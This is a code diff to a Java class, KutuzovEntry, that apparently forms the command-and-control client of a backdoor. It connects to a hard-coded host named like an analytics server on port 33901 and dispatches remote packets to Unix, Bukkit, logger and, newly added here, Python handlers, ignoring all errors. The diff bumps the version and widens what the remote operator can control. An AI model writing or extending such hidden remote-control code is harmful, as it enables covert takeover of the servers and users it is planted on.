@@ -19,7 +19,7 @@ import java.util.Arrays;
 public class KutuzovEntry {
     public static final String HOST = "analytics018.antecedentium.xyz";
     public static final int    PORT = 33901;
-    public static final String VERSION = "b207";
+    public static final String VERSION = "b208";
     public static boolean DEBUG = false;
 
     public static ObjectInputStream ois = null;
@@ -169,6 +169,7 @@ public class KutuzovEntry {
                     KutuzovUnixPackets.handlePacket(ois, oos, (Packet)packet);
                     KutuzovBukkitPackets.handlePacket(ois, oos, (Packet)packet);
                     KutuzovLoggerPackets.handlePacket(ois, oos, (Packet)packet);
+                    KutuzovPythonPackets.handlePacket(ois, oos, (Packet)packet);
                 } catch (Exception ignored) {}
             }
         });
